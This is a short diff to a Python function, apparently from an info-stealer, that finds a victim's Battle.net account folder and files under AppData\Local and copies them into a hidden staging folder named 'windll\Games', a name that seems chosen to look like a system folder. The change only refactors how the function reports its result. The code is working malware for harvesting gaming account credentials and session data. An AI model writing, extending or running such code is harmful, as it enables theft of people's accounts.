@@ -14,8 +14,9 @@ from os import sep,environ,makedirs,path
 from shutil import copytree, copy2
 from manager.logger import Log
 
-def BattleNet(data):
+def BattleNet():
     pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
+    msgInfo = ""
     if path.exists(f"{pathtofolder}\Battle.net\Account"):
         folders= [
             r'\Battle.net\Account',
@@ -38,8 +39,8 @@ def BattleNet(data):
                 copy2(f"{pathtofolder}{file}",f"{pathtofolder}\windll\Games{file}")
             except Exception as e:
                 Log(f"BattleNet(files) ---> {e}")
-        data.append("\n∟🎮Battle.net")
-        return data
+        msgInfo+="\n∟🎮Battle.net"
+        return msgInfo
     else:
         Log("BattleNet ---> Not exist")
-        return data
+        return msgInfo
